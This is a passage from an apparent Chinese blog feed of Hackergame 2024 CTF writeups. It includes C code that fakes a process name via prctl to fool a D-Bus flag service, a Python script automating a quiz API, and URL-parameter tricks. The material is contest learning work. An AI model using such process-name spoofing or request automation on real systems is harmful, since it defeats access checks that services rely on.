punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/proc/%d/comm"</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>gchar <span class="token operator">*</span>comm<span class="token punctuation">;</span>gsize len<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">g_file_get_contents</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token operator">&amp;</span>comm<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">,</span> <span class="token operator">&amp;</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">g_strcmp0</span><span class="token punctuation">(</span>comm<span class="token punctuation">,</span> <span class="token string">"getflag3\n"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">respond_error_msg</span><span class="token punctuation">(</span>invocation<span class="token punctuation">,</span>                             <span class="token string">"You shall use getflag3 to call me!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">respond_success</span><span class="token punctuation">(</span>invocation<span class="token punctuation">,</span> flag3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">respond_error</span><span class="token punctuation">(</span>invocation<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一问反而比较容易理解，是需要用一个名叫<code>getflag3</code>的进程去与服务交互，才能拿到flag3。</p><p>一开始也尝试了各种<code>bash</code>脚本，试图伪造进程名（我也不知道能不能伪造），但始终不行，最后突然发现，附件里竟然有个<code>getflag3.c</code>？</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;gio/gio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEST</span> <span class="token string">"cn.edu.ustc.lug.hack.FlagService"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">OBJECT_PATH</span> <span class="token string">"/cn/edu/ustc/lug/hack/FlagService"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">METHOD</span> <span class="token string">"GetFlag3"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INTERFACE</span> <span class="token string">"cn.edu.ustc.lug.hack.FlagService"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  GError <span class="token operator">*</span>error <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  GDBusConnection <span class="token operator">*</span>connection<span class="token punctuation">;</span>  GVariant <span class="token operator">*</span>result<span class="token punctuation">;</span>  connection <span class="token operator">=</span> <span class="token function">g_bus_get_sync</span><span class="token punctuation">(</span>G_BUS_TYPE_SYSTEM<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>connection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">g_printerr</span><span class="token punctuation">(</span><span class="token string">"Failed to connect to the system bus: %s\n"</span><span class="token punctuation">,</span> error<span class="token operator">-></span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">g_error_free</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> EXIT_FAILURE<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// Call the D-Bus method</span>  result <span class="token operator">=</span> <span class="token function">g_dbus_connection_call_sync</span><span class="token punctuation">(</span>connection<span class="token punctuation">,</span>                                       DEST<span class="token punctuation">,</span>        <span class="token comment">// destination</span>                                       OBJECT_PATH<span class="token punctuation">,</span> <span class="token comment">// object path</span>                                       INTERFACE<span class="token punctuation">,</span>   <span class="token comment">// interface name</span>                                       METHOD<span class="token punctuation">,</span>      <span class="token comment">// method</span>                                       <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token comment">// parameters</span>                                       <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token comment">// expected return type</span>                                       G_DBUS_CALL_FLAGS_NONE<span class="token punctuation">,</span>                                       <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment">// timeout (use default)</span>                                       <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">g_print</span><span class="token punctuation">(</span><span class="token string">"Get result but I won't show you :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">g_variant_unref</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">g_printerr</span><span class="token punctuation">(</span><span class="token string">"Error calling D-Bus method %s: %s\n"</span><span class="token punctuation">,</span> METHOD<span class="token punctuation">,</span> error<span class="token operator">-></span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">g_error_free</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">g_object_unref</span><span class="token punctuation">(</span>connection<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> EXIT_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看来服务器上应该也有这么个可执行文件放在那里，不过显然，直接用<code>bash</code>去调用它，会得到<code>Get result but I won&#39;t show you :)</code></p><p>不过这源代码都给了，我不是可以直接抄下来魔改一下？把<code>if (result) &#123;</code>这部分代码修改为下面这样：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    gchar <span class="token operator">*</span>response<span class="token punctuation">;</span>    <span class="token function">g_variant_get</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">"(s)"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">g_print</span><span class="token punctuation">(</span><span class="token string">"flag3: %s\n"</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">g_variant_unref</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但要怎么伪装进程名呢？问了下GPT发现可以用<code>prctl</code></p><p><img src="https://blogfiles.oss.fyz666.xyz/png/5f9de1f2-e227-4180-84cd-3ee0856d487f.png" alt="image-20241109190410937" style="zoom:50%;" /></p><p>不过这里它多给了一个换行符，手动把它去掉即可。最终的代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;gio/gio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEST</span> <span class="token string">"cn.edu.ustc.lug.hack.FlagService"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">OBJECT_PATH</span> <span class="token string">"/cn/edu/ustc/lug/hack/FlagService"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">METHOD</span> <span class="token string">"GetFlag3"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INTERFACE</span> <span class="token string">"cn.edu.ustc.lug.hack.FlagService"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    GError <span class="token operator">*</span>error <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    GDBusConnection <span class="token operator">*</span>connection<span class="token punctuation">;</span>    GVariant <span class="token operator">*</span>result<span class="token punctuation">;</span>    <span class="token function">prctl</span><span class="token punctuation">(</span>PR_SET_NAME<span class="token punctuation">,</span> <span class="token string">"getflag3"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    connection <span class="token operator">=</span> <span class="token function">g_bus_get_sync</span><span class="token punctuation">(</span>G_BUS_TYPE_SYSTEM<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>connection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">g_printerr</span><span class="token punctuation">(</span><span class="token string">"Failed to connect to the system bus: %s\n"</span><span class="token punctuation">,</span> error<span class="token operator">-></span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">g_error_free</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> EXIT_FAILURE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    result <span class="token operator">=</span> <span class="token function">g_dbus_connection_call_sync</span><span class="token punctuation">(</span>connection<span class="token punctuation">,</span>                                         DEST<span class="token punctuation">,</span>                                         OBJECT_PATH<span class="token punctuation">,</span>                                         INTERFACE<span class="token punctuation">,</span>                                         METHOD<span class="token punctuation">,</span>                                         <span class="token constant">NULL</span><span class="token punctuation">,</span>                                         <span class="token constant">NULL</span><span class="token punctuation">,</span>                                         G_DBUS_CALL_FLAGS_NONE<span class="token punctuation">,</span>                                         <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>                                         <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        gchar <span class="token operator">*</span>response<span class="token punctuation">;</span>        <span class="token function">g_variant_get</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">"(s)"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">g_print</span><span class="token punctuation">(</span><span class="token string">"flag3: %s\n"</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">g_variant_unref</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">g_printerr</span><span class="token punctuation">(</span><span class="token string">"Error calling D-Bus method %s: %s\n"</span><span class="token punctuation">,</span> METHOD<span class="token punctuation">,</span> error<span class="token operator">-></span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">g_error_free</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">g_object_unref</span><span class="token punctuation">(</span>connection<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> EXIT_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;本文是Hackergame 2024 题解的第二部分。&lt;/p&gt;
&lt;h2 id=&quot;惜字如金-3-0&quot;&gt;&lt;a href=&quot;#惜字如金-3-0&quot; class=&quot;headerlink&quot; title=&quot;惜字如金 3.0&quot;&gt;&lt;/a&gt;惜字如金 3.0&lt;/h2&gt;&lt;details</summary>
        
      
    
    
    
    <category term="CTF题解" scheme="https://blog.fyz666.xyz/categories/ctf%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="Hackergame" scheme="https://blog.fyz666.xyz/tags/hackergame/"/>
    
    <category term="Hackergame 2024" scheme="https://blog.fyz666.xyz/tags/hackergame-2024/"/>
    
  </entry>
  
  <entry>
    <title>Hackergame 2024 题解（一）</title>
    <link href="https://blog.fyz666.xyz/blog/12160/"/>
    <id>https://blog.fyz666.xyz/blog/12160/</id>
    <published>2024-11-09T05:10:22.000Z</published>
    <updated>2025-08-14T08:53:41.567Z</updated>
    
    <content type="html"><![CDATA[<p>本文是Hackergame 2024 题解的第一部分。</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>让我们说……各种语言，开始今年的冒险！</p><audio controls='' src="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/%E7%AD%BE%E5%88%B0/files/Hackergame.mp3"></audio><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">Hackergame～🚩🎶哦Hackergame～🚩🎶哦Hackergame🚩🎶有了你😙❤️🚩，生活美好😍🙏💐，没烦恼🤷🤤🎼Hackergame传奇🌊🚩🧜‍♂️，奇妙至极✨🧞‍♂️最棒比赛🤩👾🎮，人人赞叹你👍👍👍如果卡关😖😭，那可不对🙅⭕️😝今晚没拿flag🚩😨❓，我就会吼叫😱😱🙉无论白天☀️🤤🚩，还是黑夜🌙😪💤Hackergame的挑战让头脑清醒🤯🤯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></div></details><p>直接提交，把参数<code>?pass=false</code>改成<code>?pass=true</code>重新访问即可。</p><p><del>这歌真洗脑，每天听几遍</del></p><h2 id="喜欢做签到的-CTFer-你们好呀"><a href="#喜欢做签到的-CTFer-你们好呀" class="headerlink" title="喜欢做签到的 CTFer 你们好呀"></a>喜欢做签到的 CTFer 你们好呀</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>喜欢做签到的 CTFer 你们好呀，我是一道更<strong>典型</strong>的 checkin：有两个 flag 就藏在中国科学技术大学校内 CTF 战队的招新主页里！</p></div></div></details><p>众所周知，中国科学技术大学校内CTF战队是Nebula，找到<a href="https://www.nebuu.la/">招新主页</a>。</p><p>打开发现是个网页模拟的终端，发现<code>ls -a</code>可以找到第二个flag，<code>env</code>可以找到第一个flag。(第一个flag找了半天，因为一开始完全没想到去看环境变量)</p><h2 id="猫咪问答（Hackergame-十周年纪念版）"><a href="#猫咪问答（Hackergame-十周年纪念版）" class="headerlink" title="猫咪问答（Hackergame 十周年纪念版）"></a>猫咪问答（Hackergame 十周年纪念版）</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><ol><li><p>在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？<strong>（30 分）</strong></p><p>提示：填写教室编号，如 5207、3A101。</p></li><li><p>众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？<strong>（30 分）</strong></p><p>提示：是一个非负整数。</p></li><li><p>Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？<strong>（20 分）</strong></p><p>提示：仅由中文汉字构成。</p></li><li><p>在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？<strong>（10 分）</strong></p><p>提示：是一个非负整数。</p></li><li><p>10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？<strong>（5 分）</strong></p><p>提示：id 前 6 位，字母小写，如 c1e939。</p></li><li><p>大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？<strong>（5 分）</strong></p><p>提示：首次打开本页时的 HTML 源代码，答案是一个非负整数</p></li></ol></div></div></details><ol><li><p>这题找了半天，因为那一年的Hackergame好像没写新闻稿，甚至似乎还不叫Hackergame，叫什么「信息安全大赛」，最后在<a href="https://lug.ustc.edu.cn/wiki/sec/contest.html">这个页面</a>翻到了结果，答案为3A204</p></li><li><p>翻官方GitHub存档发现是2019年（注意只需要看2019-2023年这5年的题），然后搜到<a href="https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/">网页</a>，答案为2682</p></li><li><p>搜图书馆官网没有搜到相关信息（图书馆怎么可能去记录这种东西），然后想到去GitHub上的2018年题解存档的<a href="https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md">花絮页</a>看看，发现了答案：程序员的自我修养</p></li><li><p>搜到<a href="https://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui">相关论文</a>，<del>把里面出现到的数字都试了一遍</del>，然后找到答案：336</p></li><li><p>前段时间正好关注了这个事件，当时就找到了<a href="https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2">相关的commit</a>，于是这题不废催飞滋力</p></li><li><p>找到了这个模型的hf页面，结果：<img src="https://blogfiles.oss.fyz666.xyz/png/ddee409c-fbd4-4312-881a-fc5c55988feb.png" alt="image-20241109134621799" style="zoom:50%;" /></p><p>蚌！后来找了一个<a href="https://huggingface.co/spaces/Xenova/the-tokenizer-playground">在线运行分词器的网页</a>。复制进去得到1834，提交发现不对，遂去穷举，得到答案1833。原来是之前复制进去最开始多了换行。</p></li></ol><h2 id="打不开的盒"><a href="#打不开的盒" class="headerlink" title="打不开的盒"></a>打不开的盒</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>如果一块砖头里塞进了一张写了 flag 的纸条，应该怎么办呢？相信这不是一件困难的事情。</p><p>现在，你遇到了同样的情况：这里有一个密封盒子的设计文件，透过镂空的表面你看到里面有些东西……</p><p><img src="https://raw.githubusercontent.com/USTC-Hackergame/hackergame2024-writeups/refs/heads/master/official/%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E7%9B%92/files/flagbox.jpg" style="zoom:50%;"></p><p><a href="https://raw.githubusercontent.com/USTC-Hackergame/hackergame2024-writeups/refs/heads/master/official/%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E7%9B%92/files/flagbox.stl">本题附件</a></p></div></div></details><p>找到一个在线查看这种文件的<a href="https://www.viewstl.com/classic/">网页</a>。</p><p>然后逐个尝试右边的选项，最后发现把<code>Display</code>下面的<code>Wireframe</code>选上，即可发现flag：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/3d6070a6-2676-43fc-8549-cc91cb9e4b36.png" alt="image-20241109135258547" style="zoom:50%;" /></p><p>放大以后可以直接肉眼看出。</p><p>另：如果奖品能附带发个这个盒子的透明版，那一定是极好的。</p><h2 id="每日论文太多了！"><a href="#每日论文太多了！" class="headerlink" title="每日论文太多了！"></a>每日论文太多了！</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>传闻，每日新发表的论文</p><p>有七成都会在一年内被遗忘</p><p>而且五年后</p><p>基本都无人问津</p><p>它们被学术界的快节奏淹没</p><p>有人引用</p><p>有人忽视</p><p>我不期盼这学术世界，以及我的研究</p><p>能在这汪洋般的文献中脱颖而出</p><p>然而，我有时会思考</p><p>如果我的论文能被更多人阅读</p><p>如果我的研究能对他人有所启发</p><p>如果我能为这个领域贡献一点价值</p><p>届时</p><p>我将作何感想</p><p align="right">——改编自「負けヒロインが多すぎる！」Ep 1，存在 AI 创作</p><p>要怎么做才能读读 <a href="https://dl.acm.org/doi/10.1145/3650212.3652145">我们的论文</a>？只要是我能做的，我什么都愿意做！</p></div></div></details><p>给了一个<a href="https://dl.acm.org/doi/10.1145/3650212.3652145">ACM论文的链接</a>，然后没有其他任何附件了？</p><p>我百思不解，总不可能在ACM官网上做文章吧。于是我打开论文，去了解了一下这个论文的算法，找到了他给的源码GitHub链接。我甚至把这个项目跑了起来，但始终想不通这和拿flag有什么关系。</p><hr><p>后来这个题解出的人越来越多，我意识到自己的方向出了问题。我打开论文直接搜索flag，居然搜到了一处高亮：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/9b83fc7a-3041-40ed-a93d-c665cbd8c378.png" alt="image-20241109135919432" style="zoom:50%;" /></p><p>然而看上去又什么都没有，复制一下这里的内容，发现是“flag here”，难道flag藏在图里？</p><p>于是我把这篇论文的pdf的图片全部导出，然后发现：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/681c0ca5-fdac-4654-911c-031ef293624a.png" alt="image-20241109140111767" style="zoom:50%;" /></p><p>草，这是什么行为艺术？</p><h2 id="比大小王"><a href="#比大小王" class="headerlink" title="比大小王"></a>比大小王</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>「小孩哥，你干了什么？竟然能一边原崩绝鸣舟，一边农瓦 CSGO。你不去做作业，我等如何排位上分？」</p><p>小孩哥不禁莞尔，淡然道：「很简单，做完口算题，拿下比大小王，家长不就让我玩游戏了？」</p><p>说罢，小孩哥的气息终于不再掩饰，一百道题，十秒速通。</p><p>在这场巅峰对决中，你能否逆风翻盘狙击小孩哥，捍卫我方尊严，成为新一代的「比大小王」？！</p></div></div></details><p>这题估计灵感来源于前段时间很火的<a href="https://app.xinhuanet.com/news/article.html?articleId=d8b06038c4cf4dd3e32c5fc653f3419c">大学生入侵小猿搜题事件</a></p><p>咦，这不是写脚本就行了？一开始我写了个JS脚本，试图在浏览器里直接给他过了，结果发现题目的刷新似乎存在延迟，我无论如何都没法在10秒内跑完全部题目。遂分析了一下接口，然后写了个Python脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json<span class="token keyword">import</span> time<span class="token keyword">import</span> requestssess <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'content-type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>    <span class="token string">'cookie'</span><span class="token punctuation">:</span> <span class="token string">'Your cookie here'</span><span class="token punctuation">&#125;</span>game <span class="token operator">=</span> sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://202.38.93.141:12122/game'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'values'</span><span class="token punctuation">]</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'inputs'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> game<span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">&lt;</span> b<span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>headers<span class="token punctuation">[</span><span class="token string">'cookie'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'session=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sess<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>r <span class="token operator">=</span> sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://202.38.93.141:12122/submit'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>稍微处理了一下<code>Cookie</code>就过了。</p><h2 id="旅行照片-4-0"><a href="#旅行照片-4-0" class="headerlink" title="旅行照片 4.0"></a>旅行照片 4.0</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>「又要重复吗，绝望的轮回」</p><p>你的学长今年还在旅游…… 对，对吗？你似乎注意到了什么。</p></div></div></details><details class="toggle" ><summary class="toggle-button" style="">...LEO 酱？……什么时候</summary><div class="toggle-content"><p>「说起来最近学长的 ** 空间里怎么没有旅游的照片了……」</p><p>正当你在这样想的时候，突然刷到学长的一条吐槽：</p><blockquote><blockquote><p>你们的生活到底真的假的呀？每天要么就是看漫展看偶像看 live 喝酒吃烧烤，要么就是这里那里旅游。阵容一宣，说冲就冲，群一拉，机票一买，钱就像大风刮来的，时间好像一直有。c**4 你们也去，mu**ca 你们也去，m**o 你们也去，to*ea*i 